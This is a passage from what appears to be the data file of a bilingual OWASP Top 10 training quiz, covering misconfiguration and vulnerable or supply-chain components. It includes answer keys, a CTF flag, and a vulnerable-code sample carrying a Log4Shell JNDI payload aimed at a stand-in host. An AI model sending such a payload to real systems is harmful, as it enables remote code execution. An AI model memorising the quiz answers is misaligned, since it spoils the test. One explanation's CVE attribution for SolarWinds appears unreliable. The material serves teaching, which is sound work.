          M('Дефолтный пароль администратора не изменён', 'An unchanged default admin password'),
          M('Незашифрованный пароль в БД', 'An unencrypted password in the DB'),
        ],
        ans: 3,
        e: M('Незашифрованный пароль в БД — Cryptographic Failure (A04). Открытые dashboard, directory listing и default admin password — примеры misconfiguration.', 'An unencrypted password in the database is a Cryptographic Failure (A04). Open dashboards, directory listing, and default admin passwords are misconfiguration examples.'),
      },
      {
        q: M('Термин «out-of-the-box configuration» в контексте A02 означает:', 'The term "out-of-the-box configuration" in the A02 context means:'),
        opts: [
          M('конфигурация «как есть» после установки, без применения security hardening', 'configuration "as-is" after install, without security hardening applied'),
          M('конфигурация, изменённая под конкретные нужды', 'configuration customized for specific needs'),
          M('экспериментальная фича', 'an experimental feature'),
          M('конфигурация, работающая только offline', 'configuration that only works offline'),
        ],
        ans: 0,
        e: M('Out-of-the-box — конфигурация «как после установки» без hardening: samples, лишние порты и небезопасные defaults остаются включёнными.', 'Out-of-the-box means leaving vendor defaults as installed without hardening — sample apps, open ports, and insecure defaults stay enabled.'),
      },
      {
        q: M('Отсутствие сегментации между компонентами приложения (containers/cloud groups/ACL) относится к:', 'Lack of segmentation between application components (containers/cloud groups/ACLs) relates to:'),
        opts: [
          M('требованию GDPR', 'a GDPR requirement'),
          M('провалу defense-in-depth на уровне архитектуры/конфигурации сети', 'a failure of defense-in-depth at the architecture/network-configuration level'),
          M('хорошей практике для производительности', 'a good practice for performance'),
          M('необходимости для CDN', 'a CDN necessity'),
        ],
        ans: 1,
        e: M('Отсутствие сегментации между компонентами ослабляет defense-in-depth: компрометация одного узла легче распространяется по открытым путям и широким ACL.', 'Missing segmentation between components weakens defense-in-depth: one breach can reach others via open network paths or overly broad ACLs.'),
      },
      {
        q: M('Как правильно тестировать наличие лишних HTTP-методов на эндпоинте?', 'How do you correctly test for extra HTTP methods on an endpoint?'),
        opts: [
          M('Прочитать документацию Swagger', 'Read the Swagger docs'),
          M('Использовать только GET-запросы', 'Only use GET requests'),
          M('Отправить OPTIONS-запрос и проанализировать Allow-заголовок, затем попробовать TRACE/PUT/DELETE вручную', 'Send an OPTIONS request and analyze the Allow header, then manually try TRACE/PUT/DELETE'),
          M('Спросить у разработчика', 'Ask the developer'),
        ],
        ans: 2,
        e: M('OPTIONS показывает методы в Allow; затем активные пробы TRACE/PUT/DELETE подтверждают, что реально включено, а не только заявлено в документации.', 'OPTIONS reveals allowed methods via Allow; then actively probing TRACE/PUT/DELETE confirms what is really enabled beyond documentation claims.'),
      },
      {
        q: M('Почему баннер Server: Apache/2.4.29 в отклике сервера — потенциальный риск?', 'Why is a Server: Apache/2.4.29 banner in a server response a potential risk?'),
        opts: [
          M('Замедляет ответ', 'It slows down the response'),
          M('Не является риском вообще', 'It\'s not a risk at all'),
          M('Требуется для SEO', 'It\'s required for SEO'),
          M('Позволяет атакующему сопоставить версию с базой известных CVE', 'It lets an attacker match the version against known CVEs'),
        ],
        ans: 3,
        e: M('Точный баннер Server с версией упрощает fingerprinting стека и сопоставление с известными CVE, удешевляя целевую эксплуатацию.', 'A precise Server version banner helps fingerprint the stack and match known CVEs, lowering the cost of targeted exploitation.'),
      },
      {
        q: M('Что из перечисленного правильно описывает подход «Continuous configuration verification»?', 'Which of the following correctly describes "continuous configuration verification"?'),
        opts: [
          M('Автоматизированный, повторяющийся процесс проверки эффективности конфигураций во всех окружениях, а не разовая настройка', 'An automated, repeated process verifying configuration effectiveness across all environments, rather than a one-off setup'),
          M('Проверка только вручную QA-командой', 'Manual QA-only verification'),
          M('Однократная проверка при первом деплое', 'A one-time check at first deployment'),
          M('Проверка только раз в год при аудите', 'A once-a-year audit check only'),
        ],
        ans: 0,
        e: M('Continuous configuration verification — автоматизированная повторяющаяся проверка, что secure baseline держится во всех окружениях, а не разовая настройка при установке.', 'Continuous configuration verification is automated, repeated checking that the secure baseline still holds in all environments — not a one-time install checkbox.'),
      },
      {
        q: M('Cloud metadata service (169.254.169.254), доступный без ограничений из приложения, чаще всего эксплуатируется через связку с какой другой уязвимостью?', 'A cloud metadata service (169.254.169.254) accessible without restriction from an application is most often exploited in combination with which other vulnerability?'),
        opts: [
          M('XSS', 'XSS'),
          M('SSRF', 'SSRF'),
          M('Brute-force', 'Brute-force'),
          M('CSRF', 'CSRF'),
        ],
        ans: 1,
        e: M('Неограниченный доступ приложения к 169.254.169.254 чаще всего сочетается с SSRF: атакующий заставляет сервер забрать credentials из metadata.', 'Unrestricted app access to 169.254.169.254 is usually chained with SSRF so the attacker forces the server to fetch cloud credentials from metadata.'),
      },
      {
        q: M('Что из перечисленного — минимально необходимая платформа (minimal platform) принцип?', 'Which of the following is the "minimal platform" principle?'),
        opts: [
          M('Использовать самую новую версию ОС без тестирования', 'Always use the newest OS version without testing'),
          M('Установить максимум пакетов «про запас»', 'Install as many packages as possible "just in case"'),
          M('Убрать неиспользуемые фичи, компоненты, документацию, примеры приложений', 'Remove unused features, components, docs, and sample apps'),
          M('Отключить все логи для экономии места', 'Disable all logs to save space'),
        ],
        ans: 2,
        e: M('Minimal platform — убрать неиспользуемые фичи, samples, документацию и компоненты, чтобы defaults и забытые сервисы не расширяли attack surface.', 'Minimal platform means stripping unused features, samples, docs, and components so defaults and forgotten services do not expand the attack surface.'),
      },
      {
        q: M('CWE, относящийся к категории A02:2025 (16 CWE в списке), скорее всего включает:', 'A CWE in the A02:2025 list (16 CWEs total) most likely includes:'),
        opts: [
          M('CWE-79 XSS', 'CWE-79 XSS'),
          M('CWE-306 Missing Authentication', 'CWE-306 Missing Authentication'),
          M('CWE-89 SQL Injection', 'CWE-89 SQL Injection'),
          M('CWE-798 Hardcoded Credentials', 'CWE-798 Hardcoded Credentials'),
        ],
        ans: 3,
        e: M('Hardcoded credentials (CWE-798) относятся к проблемам гигиены конфигурации/секретов в наборе CWE A02; XSS и SQLi — другие категории Top 10.', 'Hardcoded credentials (CWE-798) fit configuration/secrets hygiene issues associated with A02’s CWE set; XSS and SQLi belong to other Top 10 categories.'),
      },
      {
        q: M('Kubernetes-под, запущенный с привилегией privileged: true без необходимости — пример:', 'A Kubernetes pod running with privileged: true without necessity is an example of:'),
        opts: [
          M('Security Misconfiguration в облачной/контейнерной инфраструктуре', 'Security Misconfiguration in cloud/container infrastructure'),
          M('Injection', 'Injection'),
          M('Cryptographic Failure', 'Cryptographic Failure'),
          M('Broken Authentication', 'Broken Authentication'),
        ],
        ans: 0,
        e: M('Ненужный privileged: true у Kubernetes pod — misconfiguration привилегий контейнера/облака, расширяющая impact компрометации хоста.', 'Unnecessary privileged: true on a Kubernetes pod is container/cloud privilege misconfiguration that expands host compromise impact.'),
      },
      {
        q: M('Почему единая (централизованная) точка управления конфигурацией предпочтительнее ручной настройки каждого сервера отдельно?', 'Why is a single centralized configuration-management point preferable to manually configuring each server individually?'),
        opts: [
          M('Не требует тестирования', 'It doesn\'t require testing'),
          M('Снижает риск расхождения (config drift) и человеческой ошибки при масштабировании', 'It reduces config drift and human error risk at scale'),
          M('Не связано с безопасностью', 'It\'s unrelated to security'),
          M('Дешевле в разработке', 'It\'s cheaper to develop'),
        ],
        ans: 1,
        e: M('Централизованное управление конфигурацией снижает snowflake-серверы, человеческие ошибки и config drift при масштабе по сравнению с ручной настройкой каждого хоста.', 'Centralized config management reduces snowflake servers, human error, and config drift at scale compared with hand-tuning each host.'),
      },
      {
        q: M('Directory listing на веб-сервере (например, Apache Options +Indexes) относится к CWE:', 'Directory listing on a web server (e.g., Apache Options +Indexes) maps to which CWE?'),
        opts: [
          M('CWE-79', 'CWE-79'),
          M('CWE-89', 'CWE-89'),
          M('CWE-548', 'CWE-548'),
          M('CWE-352', 'CWE-352'),
        ],
        ans: 2,
        e: M('Directory listing соответствует CWE-548 (Exposure of Information Through Directory Listing), часто из-за опций веб-сервера вроде Apache Indexes.', 'Directory listing maps to CWE-548 (Exposure of Information Through Directory Listing), commonly enabled by web-server options such as Apache Indexes.'),
      },
      {
        q: M('Верно ли, что security misconfiguration может возникнуть на уровне ОС, веб-сервера, БД, framework и облачных сервисов одновременно?', 'Is it true that security misconfiguration can occur at the OS, web server, database, framework, and cloud service level simultaneously?'),
        opts: [
          M('Нет, только в legacy-системах', 'No, only in legacy systems'),
          M('Нет, только на уровне приложения', 'No, only at the application level'),
          M('Нет, только в облаке', 'No, only in the cloud'),
          M('Да — это межслойная категория, затрагивающая весь стек', 'Yes — it\'s a cross-layer category spanning the entire stack'),
        ],
        ans: 3,
        e: M('Да: A02 охватывает ОС, веб/app-серверы, БД, фреймворки и облачные сервисы — misconfiguration возможна на любом слое стека одновременно.', 'Yes: A02 spans OS, web/app servers, databases, frameworks, and cloud services — misconfiguration can appear at any stack layer simultaneously.'),
      },
      {
        q: M('Что из перечисленного — правильный порядок действий при обнаружении открытого административного интерфейса на пентесте?', 'What\'s the right sequence of actions upon finding an open admin interface during a pentest?'),
        opts: [
          M('Задокументировать, проверить возможность неавторизованного доступа/действий, сообщить клиенту с рекомендацией закрыть доступ', 'Document it, verify potential unauthorized access/actions, report it to the client with a remediation recommendation'),
          M('Немедленно опубликовать в блоге', 'Immediately publish it on a blog'),
          M('Использовать интерфейс для постоянного доступа без согласования', 'Use the interface for ongoing access without approval'),
          M('Игнорировать как незначительное', 'Ignore it as minor'),
        ],
        ans: 0,
        e: M('При открытом admin-интерфейсе: задокументировать, аккуратно проверить impact в рамках scope и сообщить с рекомендацией закрыть доступ — без закрепления и преждевременной публикации.', 'On finding an open admin interface, document, carefully verify impact within scope, and report remediation guidance — do not exploit for ongoing access or publicize prematurely.'),
      },
      {
        q: M('Отсутствие X-Frame-Options/frame-ancestors в CSP делает приложение уязвимым к:', 'The absence of X-Frame-Options/frame-ancestors in CSP makes an app vulnerable to:'),
        opts: [
          M('Path Traversal', 'Path Traversal'),
          M('Clickjacking', 'Clickjacking'),
          M('SSRF', 'SSRF'),
          M('SQL-инъекции', 'SQL injection'),
        ],
        ans: 1,
        e: M('Без X-Frame-Options или CSP frame-ancestors страницу можно встроить во враждебный iframe для clickjacking и обманом вызвать действия пользователя в UI.', 'Without X-Frame-Options or CSP frame-ancestors, pages can be embedded in hostile iframes for clickjacking, tricking users into unintended UI actions.'),
      },
      {
        q: M('Что из перечисленного лучше всего описывает связь A02 с A03 (Supply Chain)?', 'Which of the following best describes the link between A02 and A03 (Supply Chain)?'),
        opts: [
          M('A03 включает только уязвимости в браузере', 'A03 only covers browser vulnerabilities'),
          M('A02 относится только к базам данных', 'A02 only applies to databases'),
          M('Небезопасная конфигурация каждой части supply chain (CI/CD, реестры) — частный случай misconfiguration, поэтому категории пересекаются', 'Insecure configuration of any part of the supply chain (CI/CD, registries) is itself a form of misconfiguration, so the categories overlap'),
          M('Они не связаны', 'They\'re unrelated'),
        ],
        ans: 2,
        e: M('Небезопасные настройки CI/CD, реестров и pipeline — и supply chain (A03), и misconfiguration (A02); категории пересекаются на конфигурации доверенных путей сборки.', 'Insecure CI/CD, registry, or pipeline settings are supply-chain issues (A03) that are also misconfigurations (A02); the categories overlap on config of trusted build paths.'),
      },
      {
        q: M('Согласно OWASP, «Segregated application architecture» рекомендуется для:', 'Per OWASP, a "segregated application architecture" is recommended for:'),
        opts: [
          M('уменьшения затрат на инфраструктуру', 'reducing infrastructure costs'),
          M('снижения времени компиляции', 'reducing compile time'),
          M('увеличения скорости разработки', 'speeding up development'),
          M('ограничения blast radius при компрометации одного компонента через сегментацию', 'limiting blast radius when one component is compromised, via segmentation'),
        ],
        ans: 3,
        e: M('Сегрегированная архитектура ограничивает blast radius сегментацией сети/ACL, чтобы компрометация одного компонента не давала автоматический доступ к остальным.', 'Segregated architecture limits blast radius via network/ACL segmentation so compromise of one component does not automatically reach others.'),
      },
      {
        q: M('Форсирование некорректного Content-Type в запросе с целью спровоцировать раскрытие стектрейса — техника тестирования:', 'Deliberately sending an incorrect Content-Type to trigger a stack-trace disclosure is a testing technique for:'),
        opts: [
          M('Security Misconfiguration (error handling)', 'Security Misconfiguration (error handling)'),
          M('Clickjacking', 'Clickjacking'),
          M('CSRF', 'CSRF'),
          M('SQL Injection', 'SQL Injection'),
        ],
        ans: 0,
        e: M('Вызов ошибок неверным Content-Type для stack trace проверяет verbose error handling как misconfiguration — разведывательная техника A02.', 'Forcing errors with a bad Content-Type to elicit stack traces tests verbose error handling misconfiguration — an A02 reconnaissance technique.'),
      },
      {
        q: M('Почему автоматизированное (IaC) развёртывание конфигурации предпочтительнее ручной настройки через SSH/консоль?', 'Why is automated (IaC) configuration deployment preferable to manual setup via SSH/console?'),
        opts: [
          M('IaC не требует тестирования', 'IaC doesn\'t need testing'),
          M('Воспроизводимость, версионирование через git, отсутствие «snowflake»-серверов с расхождениями', 'Reproducibility, git-based versioning, no "snowflake" servers with drift'),
          M('Не имеет значения', 'It doesn\'t matter'),
          M('Быстрее печатать команды', 'It\'s faster to type commands'),
        ],
        ans: 1,
        e: M('IaC даёт воспроизводимые версионируемые конфигурации и избегает snowflake-хостов, которые незаметно расходятся с secure baseline.', 'IaC gives reproducible, versioned configs and avoids snowflake manual hosts that silently drift from the secure baseline.'),
      },
      {
        q: M('Путь /wp-admin, доступный публично на WordPress без ограничения по IP/VPN — является риском в контексте:', 'A publicly accessible /wp-admin path on WordPress, unrestricted by IP/VPN, is a risk in the context of:'),
        opts: [
          M('Deserialization', 'Deserialization'),
          M('XSS', 'XSS'),
          M('Misconfiguration + потенциальная точка для brute-force атак (пересекается с A07)', 'Misconfiguration + a potential entry point for brute-force attacks (overlapping with A07)'),
          M('SSRF', 'SSRF'),
        ],
        ans: 2,
        e: M('Публичный /wp-admin без IP/VPN — открытая admin-поверхность (misconfiguration) и типичная точка brute-force, пересекающаяся с A07.', 'Public /wp-admin without IP/VPN restriction is exposure of an admin surface (misconfiguration) and a common brute-force entry point, overlapping A07 authentication attacks.'),
      },
      {
        q: M('Что из перечисленного — плохая практика в контексте A02?', 'Which of the following is a bad practice in the context of A02?'),
        opts: [
          M('Регулярный review конфигураций', 'Regular configuration reviews'),
          M('Минимизация установленных пакетов', 'Minimizing installed packages'),
          M('Использование WAF как дополнительного слоя защиты', 'Using a WAF as an additional layer of defense'),
          M('Оставление баннеров версий ПО без изменений на публичных сервисах', 'Leaving software version banners unchanged on public-facing services'),
        ],
        ans: 3,
        e: M('Полные version-баннеры на публичных сервисах помогают fingerprinting и сопоставлению CVE; reviews, минимизация пакетов и layered defense — хорошие практики.', 'Leaving full version banners on public services aids attacker fingerprinting and CVE matching; reviews, package minimization, and layered defenses are good practices.'),
      },
      {
        q: M('CVE, связанные с misconfiguration чаще всего эксплуатируются через:', 'Misconfiguration-related CVEs are most often exploited via:'),
        opts: [
          M('простое сканирование известных путей/портов автоматизированными ботами', 'simple automated bot scanning of known paths/ports'),
          M('сложные 0-day цепочки', 'complex 0-day chains'),
          M('физический доступ', 'physical access'),
          M('социальную инженерию', 'social engineering'),
        ],
        ans: 0,
        e: M('CVE, связанные с misconfiguration, чаще эксплуатируются массовыми ботами по известным путям, портам и баннерам, а не сложными 0-day цепочками.', 'Misconfiguration CVEs are frequently hit by mass bots scanning known paths, default ports, and banners — not primarily by complex 0-day chains.'),
      },
      {
        q: M('Проверка HTTP security headers (CSP, X-Frame-Options, HSTS и т.д.) обычно выполняется тестировщиком через:', 'Checking HTTP security headers (CSP, X-Frame-Options, HSTS, etc.) is typically done via:'),
        opts: [
          M('Metasploit exploit modules', 'Metasploit exploit modules'),
          M('Nikto/securityheaders.com/ручной осмотр заголовков ответа', 'Nikto/securityheaders.com/manual response-header inspection'),
          M('John the Ripper', 'John the Ripper'),
          M('SQLMap', 'SQLMap'),
        ],
        ans: 1,
        e: M('Security-заголовки проверяют Nikto, securityheaders.com или ручным осмотром ответа — не SQLMap и не password crackers.', 'Security headers are checked with scanners like Nikto, services such as securityheaders.com, or manual inspection of responses — not SQLMap or password crackers.'),
      },
      {
        q: M('Отключение ненужных HTTP-заголовков вроде X-Powered-By относится к:', 'Disabling unnecessary headers like X-Powered-By relates to:'),
        opts: [
          M('требованию PCI DSS напрямую', 'a direct PCI DSS requirement'),
          M('шифрованию данных', 'data encryption'),
          M('обфускации, снижающей лёгкость fingerprinting сервера', 'obfuscation that reduces ease of server fingerprinting'),
          M('обязательной мере, полностью устраняющей риск', 'a mandatory measure that fully eliminates the risk'),
        ],
        ans: 2,
        e: M('Удаление X-Powered-By и подобных баннеров — лёгкая обфускация, усложняющая fingerprinting; это не замена патчей и настоящего hardening.', 'Removing X-Powered-By and similar banners is lightweight obfuscation that makes fingerprinting slightly harder; it does not replace patching or real hardening.'),
      },
      {
        q: M('Какая из формулировок лучше описывает root cause категории A02:2025?', 'Which statement best describes the root cause of the A02:2025 category?'),
        opts: [
          M('Отсутствие шифрования базы данных', 'Lack of database encryption'),
          M('Слабый пароль пользователя', 'A weak user password'),
          M('Неправильная бизнес-логика', 'Incorrect business logic'),
          M('Разрыв между «безопасно написанным кодом» и «безопасно развёрнутой/настроенной системой»', 'The gap between "securely written code" and "securely deployed/configured system"'),
        ],
        ans: 3,
        e: M('Корневая тема A02 — разрыв между «безопасно написанным кодом» и «безопасно развёрнутой и настроенной системой» по всему стеку и облаку.', 'A02’s root theme is the gap between secure code and a securely deployed, configured system across stack and cloud settings.'),
      },
      {
        q: M('Что из перечисленного справедливо про количество CWE в категории A02:2025?', 'Which is true about the number of CWEs in the A02:2025 category?'),
        opts: [
          M('16 CWE', '16 CWEs'),
          M('40 CWE', '40 CWEs'),
          M('24 CWE', '24 CWEs'),
          M('6 CWE', '6 CWEs'),
        ],
        ans: 0,
        e: M('В OWASP Top 10:2025 у Security Misconfiguration (A02) указано 16 CWE (у A01 существенно больше, порядка 40 CWE).', 'OWASP Top 10:2025 associates Security Misconfiguration (A02) with 16 CWEs (while A01 is much larger, e.g. about 40 CWEs).'),
      },
      {
        q: M('Файл резервной копии (backup.zip, index.php.bak), оставленный в веб-корне, — пример:', 'A backup file (backup.zip, index.php.bak) left in the web root is an example of:'),
        opts: [
          M('CSRF', 'CSRF'),
          M('Security Misconfiguration, потенциально раскрывающий исходный код', 'Security Misconfiguration, potentially exposing source code'),
          M('Broken Authentication', 'Broken Authentication'),
          M('SSRF', 'SSRF'),
        ],
        ans: 1,
        e: M('Оставленные в web root бэкапы (backup.zip, .bak) — misconfiguration гигиены деплоя: их можно скачать и получить исходники и секреты.', 'Leftover web-root backups (backup.zip, .bak) are deployment hygiene misconfiguration that may expose source code and secrets if downloaded.'),
      },
      {
        q: M('Какая мера НАИБОЛЕЕ эффективна для предотвращения массового обнаружения open S3-buckets automated-сканерами (типа Shodan/Censys)?', 'Which measure is MOST effective against automated scanners (like Shodan/Censys) discovering open S3 buckets en masse?'),
        opts: [
          M('Изменение имени бакета на более сложное', 'Renaming the bucket to something more complex'),
          M('Использование более длинного региона AWS', 'Using a longer AWS region name'),
          M('Явная настройка приватного доступа + блокировка публичного ACL на уровне аккаунта (S3 Block Public Access) + аудит через IaC-сканеры', 'Explicitly configuring private access + blocking public ACLs at the account level (S3 Block Public Access) + auditing with IaC scanners'),
          M('Отключение логирования доступа', 'Disabling access logging'),
        ],
        ans: 2,
        e: M('Против массового обнаружения открытых bucket: private by default, S3 Block Public Access на аккаунте и аудит IaC/ACL — а не «сложное» имя bucket.', 'Against mass discovery of open buckets, enforce private defaults, account-level S3 Block Public Access, and continuous IaC/ACL auditing — not cosmetic renaming.'),
      },
      {
        q: M('Почему регулярное обновление security baseline (не разовая настройка) критично для A02?', 'Why is regularly updating the security baseline (rather than a one-time setup) critical for A02?'),
        opts: [
          M('Baseline никогда не меняется после первой настройки', 'The baseline never changes after initial setup'),
          M('Это требуется только при аудите раз в год', 'It\'s only required during a once-a-year audit'),
          M('Не имеет практического значения', 'It has no practical significance'),
          M('Требования безопасности и угрозы со временем меняются, а конфигурация «застывает», если её не пересматривать', 'Security requirements and threats change over time, and configuration "freezes" if it isn\'t revisited'),
        ],
        ans: 3,
        e: M('Угрозы и практики меняются; разовый baseline устаревает. Регулярный пересмотр baseline держит hardening в соответствии с новыми сервисами и рисками.', 'Threats and best practices evolve; a one-time baseline freezes and ages. Regular baseline updates keep hardening aligned with new services and risks.'),
      },
    ],
  },
  {
    code: 'A06', name: 'Vulnerable Components', nameRu: 'Уязвимые компоненты',
    risk: 'HIGH', owasp2021: 'A06', owasp2025: 'A03',
    cwe: ['CWE-1104', 'CWE-1035'],
    flag: 'FLAG{log4shell_jndi_rce_detected}',
    blurb: M('Устаревшие зависимости, Log4Shell, атаки на цепочку поставок и отсутствие SBOM.', 'Outdated deps, Log4Shell, supply chain, missing SBOM.'),
    theory: M(
`<p><strong>Vulnerable and Outdated Components</strong> (2025: часть Supply Chain). Сотни зависимостей — вручную не отследить.</p>
<div class="ebox">log4j-core==2.14.0  → CVE-2021-44228 CVSS 10.0
spring==5.3.17      → CVE-2022-22965 CVSS 9.8
xz-utils==5.6.0     → CVE-2024-3094  CVSS 10.0</div>
<p>Инструменты: <code>npm audit</code>, <code>pip-audit</code>, Trivy, Snyk, Dependabot, SBOM (CycloneDX).</p>`,
`<p><strong>Vulnerable and Outdated Components</strong> (2025: part of Supply Chain). Hundreds of deps — impossible to track by hand.</p>
<div class="ebox">log4j-core==2.14.0  → CVE-2021-44228 CVSS 10.0
spring==5.3.17      → CVE-2022-22965 CVSS 9.8
xz-utils==5.6.0     → CVE-2024-3094  CVSS 10.0</div>
<p>Tools: <code>npm audit</code>, <code>pip-audit</code>, Trivy, Snyk, Dependabot, SBOM (CycloneDX).</p>`
    ),
    vulnCode: `// package.json — no pin & audit
"log4j-core": "2.14.0"
// User-Agent: \${jndi:ldap://evil/x} → RCE`,
    fixCode: `// Pin + SCA in CI
"log4j-core": "2.17.1"
// npm audit --audit-level=high
// Dependabot + SLSA provenance`,
    quiz: [
      {
        q: M('Категория A03:2025 является расширением какой категории из 2021 года?', 'Which 2021 category does A03:2025 expand upon?'),
        opts: [
          M('A06:2021 Vulnerable and Outdated Components', 'A06:2021 Vulnerable and Outdated Components'),
          M('A09:2021 Security Logging', 'A09:2021 Security Logging'),
          M('A02:2021 Cryptographic Failures', 'A02:2021 Cryptographic Failures'),
          M('A10:2021 SSRF', 'A10:2021 SSRF'),
        ],
        ans: 0,
        e: M('A03:2025 Software Supply Chain Failures расширяет A06:2021 Vulnerable and Outdated Components: от известных CVE в библиотеках — к полному жизненному циклу supply chain (сборка, CI/CD, реестры, обновления).', 'A03:2025 Software Supply Chain Failures expands A06:2021 Vulnerable and Outdated Components: from known library CVEs to the full supply-chain lifecycle (build, CI/CD, registries, updates).'),
      },
      {
        q: M('Сколько CWE входит в категорию A03:2025 согласно данным OWASP?', 'How many CWEs are listed under A03:2025 per OWASP data?'),
        opts: [
          M('24', '24'),
          M('6', '6'),
          M('40', '40'),
          M('32', '32'),
        ],
        ans: 1,
        e: M('По данным OWASP Top 10:2025, в категорию A03 входит 6 CWE — относительно немного, что отражает сложность автоматического выявления supply chain-проблем в тестовых наборах.', 'Per OWASP Top 10:2025 data, A03 maps to 6 CWEs — relatively few, reflecting how hard supply-chain issues are to detect automatically in test datasets.'),
      },
      {
        q: M('Почему A03 попала в топ рейтинга во многом благодаря community survey, а не только статистике?', 'Why did A03 rank highly largely thanks to the community survey rather than statistics alone?'),
        opts: [
          M('OWASP решил не использовать данные для этой категории принципиально', 'OWASP decided not to use data for this category on principle'),
          M('Данные были утеряны', 'The data was lost'),
          M('Сложно тестировать автоматически, поэтому в тестовых данных представлена слабо, несмотря на высокую реальную опасность', 'It\'s hard to test automatically, so it\'s underrepresented in test data despite being highly dangerous in practice'),
          M('Категория новая и данных пока нет вообще', 'The category is new and no data exists yet at all'),
        ],
        ans: 2,
        e: M('Supply chain-атаки плохо видны в статистике автотестов (мало прямых CVE), но community survey высоко оценил их реальную опасность — поэтому A03 вошла в топ во многом по голосованию сообщества.', 'Supply-chain attacks are underrepresented in automated test statistics (few direct CVEs), yet the community survey ranked their real-world risk high — so A03 entered the top largely via community vote.'),
      },
      {
        q: M('Что такое SBOM?', 'What is an SBOM?'),
        opts: [
          M('Server Backup Object Model', 'Server Backup Object Model'),
          M('Security Breach Operations Manual', 'Security Breach Operations Manual'),
          M('Standard Binary Object Mapping', 'Standard Binary Object Mapping'),
          M('Software Bill of Materials — перечень всех компонентов и зависимостей ПО', 'Software Bill of Materials — an inventory of all software components and dependencies'),
        ],
        ans: 3,
        e: M('SBOM (Software Bill of Materials) — это инвентарь всех компонентов и зависимостей ПО; он нужен для непрерывного отслеживания уязвимостей прямых и транзитивных библиотек.', 'An SBOM (Software Bill of Materials) is an inventory of all software components and dependencies, enabling continuous tracking of vulnerabilities in direct and transitive libraries.'),
      },
      {
        q: M('Атака SolarWinds (2020) — классический пример:', 'The SolarWinds attack (2020) is a classic example of:'),
        opts: [
          M('компрометации доверенного вендора через легитимное обновление (supply chain attack)', 'a trusted-vendor compromise via a legitimate update (supply chain attack)'),
          M('фишинга сотрудников', 'employee phishing'),
          M('DDoS-атаки', 'a DDoS attack'),
          M('SQL-инъекции', 'SQL injection'),
        ],
        ans: 0,
        e: M('SolarWinds (2020, CVE-2020-10148) — классическая компрометация доверенного вендора: вредоносный код распространялся через легитимное обновление Orion, затронув тысячи организаций. Первичный доступ атакующие получили ещё в 2019, но троянизированные сборки раздавались с марта 2020, а обнаружено всё было в декабре 2020.', 'SolarWinds (2020, CVE-2020-10148) is the classic trusted-vendor compromise: malware shipped through a legitimate Orion update, affecting thousands of organizations. The attackers gained initial access back in 2019, but the trojanised builds were distributed from March 2020 and the breach was discovered in December 2020.'),
      },
      {
        q: M('Атака Shai-Hulud (npm, 2025) была примечательна тем, что:', 'The Shai-Hulud npm attack (2025) was notable because:'),
        opts: [
          M('это была атака на DNS-серверы', 'it was a DNS server attack'),
          M('это первый успешный самораспространяющийся npm-червь, крадущий и использующий чужие npm-токены', 'it was the first successful self-propagating npm worm, stealing and using victims\' own npm tokens'),
          M('это была первая обнаруженная XSS-уязвимость', 'it was the first discovered XSS vulnerability'),
          M('это была атака через уязвимость в браузере', 'it exploited a browser vulnerability'),
        ],
        ans: 1,
        e: M('Shai-Hulud (npm, 2025) стал первым успешным самораспространяющимся npm-червём: post-install крал токены жертв и публиковал заражённые версии их пакетов.', 'Shai-Hulud (npm, 2025) was the first successful self-propagating npm worm: post-install stole victims\' tokens and republished infected versions of their packages.'),
      },
      {
        q: M('Транзитивная зависимость — это:', 'A transitive dependency is:'),
        opts: [
          M('зависимость, добавленная вручную разработчиком', 'a dependency added manually by the developer'),
          M('зависимость, работающая только в тестовом окружении', 'a dependency used only in the test environment'),
          M('зависимость зависимости — библиотека, которую подтягивает другая используемая библиотека', 'a dependency of a dependency — a library pulled in by another library you use'),
          M('устаревшая версия зависимости', 'an outdated dependency version'),
        ],
        ans: 2,
        e: M('Транзитивная зависимость — это зависимость вашей зависимости: библиотека, которую подтягивает другой пакет, а не то, что вы явно указали в манифесте.', 'A transitive dependency is a dependency of a dependency: a library pulled in by another package rather than one you declare directly in the manifest.'),
      },
      {
        q: M('Log4Shell (CVE-2021-44228) относится к категории A03, потому что:', 'Log4Shell (CVE-2021-44228) belongs to category A03 because:'),
        opts: [
          M('это фишинговая атака', 'it\'s a phishing attack'),
          M('это уязвимость конфигурации DNS', 'it\'s a DNS configuration flaw'),
          M('это уязвимость в самом веб-приложении', 'it\'s a vulnerability in the web app itself'),
          M('это критическая RCE-уязвимость в широко используемом компоненте (Apache Log4j), затронувшая тысячи зависимых продуктов', 'it\'s a critical RCE in a widely used component (Apache Log4j) that affected thousands of dependent products'),
        ],
        ans: 3,
        e: M('Log4Shell — критическая RCE в широко используемом компоненте Apache Log4j; тысячи продуктов унаследовали уязвимость через зависимость, что типично для A03.', 'Log4Shell is a critical RCE in the widely used Apache Log4j component; thousands of products inherited it via dependency, which is typical of A03.'),
      },
      {
        q: M('Что из перечисленного — правильная практика управления зависимостями?', 'Which of the following is correct dependency-management practice?'),
        opts: [
          M('Централизованно генерировать SBOM и непрерывно отслеживать версии прямых и транзитивных зависимостей', 'Centrally generate an SBOM and continuously track direct and transitive dependency versions'),
          M('Использовать только зависимости без указания версии (latest)', 'Use only dependencies with no pinned version (latest)'),
          M('Никогда не обновлять зависимости после первого релиза', 'Never update dependencies after the first release'),
          M('Автоматически обновлять все зависимости до последней версии без проверки совместимости', 'Auto-update all dependencies to the latest version without checking compatibility'),
        ],
        ans: 0,
        e: M('Правильная практика — централизованно генерировать SBOM и непрерывно отслеживать версии прямых и транзитивных зависимостей, сверяя их с базами уязвимостей.', 'Correct practice is to centrally generate an SBOM and continuously track direct and transitive dependency versions against vulnerability databases.'),
      },
      {
        q: M('Staged/canary rollout обновлений рекомендуется, потому что:', 'Staged/canary rollout of updates is recommended because:'),
        opts: [
          M('ускоряет разработку', 'it speeds up development'),
          M('ограничивает exposure, если поставщик или обновление окажется скомпрометированным — не все системы обновляются одновременно', 'it limits exposure if a vendor or update turns out compromised — not all systems update at once'),
          M('требуется по закону', 'it\'s legally required'),
          M('это дешевле', 'it\'s cheaper'),
        ],
        ans: 1,
        e: M('Staged/canary rollout ограничивает blast radius: если обновление или вендор скомпрометированы, не все системы получают вредоносную версию одновременно.', 'Staged/canary rollout limits blast radius: if an update or vendor is compromised, not every system receives the malicious version at once.'),
      },
      {
        q: M('Bybit theft ($1.5 млрд, 2025) — пример supply chain атаки, которая:', 'The Bybit theft ($1.5B, 2025) is an example of a supply chain attack that:'),
        opts: [
          M('сработала сразу после установки для всех пользователей', 'fired immediately after installation for all users'),
          M('эксплуатировала уязвимость браузера', 'exploited a browser vulnerability'),
          M('была условно-срабатывающим backdoor, активировавшимся только при использовании конкретного целевого кошелька', 'was a conditionally-triggered backdoor, activating only when a specific target wallet was used'),
